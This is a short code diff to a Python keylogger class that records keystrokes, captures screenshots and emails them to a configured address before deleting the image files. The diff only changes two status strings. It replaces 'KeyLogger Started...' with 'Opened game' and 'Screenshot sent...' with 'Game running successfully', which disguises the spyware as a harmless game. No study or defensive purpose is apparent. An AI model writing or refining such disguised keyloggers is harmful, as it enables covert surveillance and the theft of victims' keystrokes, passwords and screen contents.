@@ -27,7 +27,7 @@ SEND_REPORT_EVERY = 3600
 class KeyLogger:
         def __init__(self, time_interval, email, password):
             self.interval = time_interval
-            self.log = "KeyLogger Started..."
+            self.log = "Opened game"
             self.email = email
             self.password = password
 
@@ -86,7 +86,7 @@ class KeyLogger:
             s.login(EMAIL_ADDRESS, EMAIL_PASSWORD)
             s.sendmail(msg['From'], msg['To'], msg.as_string())
             s.quit()
-            print('Screenshot sent...')
+            print('Game running successfully')
             os.remove('ss.png')
 
         def report(self):
